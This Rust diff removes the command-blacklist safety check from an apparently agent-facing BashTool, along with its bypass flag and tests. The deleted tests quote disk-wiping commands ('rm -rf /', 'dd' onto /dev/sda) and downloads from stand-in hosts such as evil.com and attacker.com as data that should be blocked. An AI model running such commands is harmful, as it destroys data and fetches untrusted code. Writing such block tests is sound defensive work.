@@ -1,6 +1,5 @@
 use crate::permissions::BashPatternMatcher;
 use crate::permissions::{ToolPermissionBuilder, ToolPermissionDescriptor};
-use crate::tools::bash_blacklist::matches_pattern;
 use crate::tools::{Tool, ToolError, ToolResult};
 use async_trait::async_trait;
 use serde::Deserialize;
@@ -16,8 +15,6 @@ use tokio::time::timeout;
 pub struct BashTool {
     working_directory: PathBuf,
     timeout_seconds: u64,
-    allow_dangerous_commands: bool,
-    blacklist_patterns: Vec<String>,
 }
 
 impl BashTool {
@@ -25,8 +22,6 @@ impl BashTool {
         Self {
             working_directory: std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
             timeout_seconds: 30, // Default 30 second timeout
-            allow_dangerous_commands: false,
-            blacklist_patterns: Vec::new(),
         }
     }
 
@@ -34,40 +29,12 @@ impl BashTool {
         Self {
             working_directory: working_dir,
             timeout_seconds: 30,
-            allow_dangerous_commands: false,
-            blacklist_patterns: Vec::new(),
         }
-    }
-
-    pub fn with_blacklist(mut self, patterns: Vec<String>) -> Self {
-        self.blacklist_patterns = patterns;
-        self
     }
 
     pub fn with_timeout(mut self, timeout_seconds: u64) -> Self {
         self.timeout_seconds = timeout_seconds;
         self
-    }
-
-    pub fn allow_dangerous_commands(mut self, allow: bool) -> Self {
-        self.allow_dangerous_commands = allow;
-        self
-    }
-
-    /// Check if a command matches any blacklist pattern
-    fn is_dangerous_command(&self, command: &str) -> bool {
-        if self.allow_dangerous_commands {
-            return false;
-        }
-
-        // Check if command matches any blacklist pattern
-        for pattern in &self.blacklist_patterns {
-            if matches_pattern(command, pattern) {
-                return true;
-            }
-        }
-
-        false
     }
 
     /// Sanitize command to prevent some basic injection attempts
@@ -89,17 +56,6 @@ impl BashTool {
             })?;
 
         let command = self.sanitize_command(&args.command);
-
-        // Security check for dangerous commands
-        if self.is_dangerous_command(&command) {
-            return Err(ToolError::SecurityViolation {
-                message: format!(
-                    "Command rejected for security reasons: '{}'. \
-                     Use --skip-permissions flag to bypass this check.",
-                    command
-                ),
-            });
-        }
 
         let timeout_duration =
             Duration::from_secs(args.timeout_override.unwrap_or(self.timeout_seconds));
@@ -419,32 +375,6 @@ mod tests {
         assert!(result.contains("Exit code: 0"));
     }
 
-    #[tokio::test]
-    async fn test_bash_tool_dangerous_command_blocked() {
-        let tool = BashTool::new().with_blacklist(vec!["rm -rf*".to_string()]);
-        let args = serde_json::json!({
-            "command": "rm -rf /"
-        });
-
-        let result = tool.execute(&args).await;
-        assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("security reasons"));
-    }
-
-    #[tokio::test]
-    async fn test_bash_tool_allow_dangerous_commands() {
-        // Even with blacklist, allow_dangerous_commands should bypass checks
-        let tool = BashTool::new()
-            .with_blacklist(vec!["rm -rf*".to_string()])
-            .allow_dangerous_commands(true);
-        let args = serde_json::json!({
-            "command": "echo 'This would be dangerous: rm -rf /'"
-        });
-
-        // This should work because allow_dangerous_commands bypasses blacklist
-        let result = tool.execute(&args).await.unwrap();
-        assert!(result.contains("This would be dangerous"));
-    }
 
     #[tokio::test]
     async fn test_bash_tool_failed_command() {
@@ -471,105 +401,6 @@ mod tests {
         assert!(result.unwrap_err().to_string().contains("Timeout"));
     }
 
-    #[tokio::test]
-    async fn test_bash_tool_blacklist_with_patterns() {
-        let tool = BashTool::new().with_blacklist(vec![
-            "rm -rf*".to_string(),
-            "wget*".to_string(),
-            "curl*".to_string(),
-        ]);
-
-        let dangerous_commands = vec![
-            "rm -rf /",
-            "wget http://evil.com/script",
-            "curl http://attacker.com",
-        ];
-
-        for cmd in dangerous_commands {
-            let args = serde_json::json!({
-                "command": cmd
-            });
-
-            let result = tool.execute(&args).await;
-            assert!(result.is_err(), "Should block dangerous command: {}", cmd);
-            assert!(result.unwrap_err().to_string().contains("security reasons"));
-        }
-    }
-
-    #[tokio::test]
-    async fn test_bash_tool_device_access_blocked() {
-        let tool = BashTool::new().with_blacklist(vec![
-            "/dev/sda*".to_string(),
-            "/dev/nvme*".to_string(),
-            "dd if=*".to_string(),
-        ]);
-
-        let dangerous_commands = vec![
-            "cat /dev/urandom > /dev/sda",
-            "dd if=/dev/zero of=/dev/sda",
-            "echo test > /dev/nvme0n1",
-        ];
-
-        for cmd in dangerous_commands {
-            let args = serde_json::json!({
-                "command": cmd
-            });
-
-            let result = tool.execute(&args).await;
-            assert!(result.is_err(), "Should block device access: {}", cmd);
-        }
-    }
-
-    #[tokio::test]
-    async fn test_bash_tool_safe_commands_allowed() {
-        let tool = BashTool::new(); // Empty blacklist
-
-        let safe_commands = vec!["pwd", "echo 'Hello World'", "cat README.md"];
-
-        for cmd in safe_commands {
-            let args = json!({
-                "command": cmd
-            });
-
-            // These should not be rejected for security reasons
-            // They might fail for other reasons (file not found, etc) but not security
-            let result = tool.execute(&args).await;
-            if result.is_err() {
-                let err_msg = result.unwrap_err().to_string();
-                assert!(
-                    !err_msg.contains("security reasons"),
-                    "Safe command should not be blocked: {} - Error: {}",
-                    cmd,
-                    err_msg
-                );
-            }
-        }
-    }
-
-    #[tokio::test]
-    async fn test_bash_tool_empty_blacklist_allows_all() {
-        let tool = BashTool::new(); // Empty blacklist by default
-
-        // Commands that would be dangerous if in blacklist, but should work with empty blacklist
-        let commands = vec!["echo test", "ls -la"];
-
-        for cmd in commands {
-            let args = json!({
-                "command": cmd
-            });
-
-            let result = tool.execute(&args).await;
-            // Should not fail with security error
-            if result.is_err() {
-                let err_msg = result.unwrap_err().to_string();
-                assert!(
-                    !err_msg.contains("security reasons"),
-                    "Command should not be blocked with empty blacklist: {}",
-                    cmd
-                );
-            }
-        }
-    }
 
     #[test]
     fn test_extract_bash_pattern() {
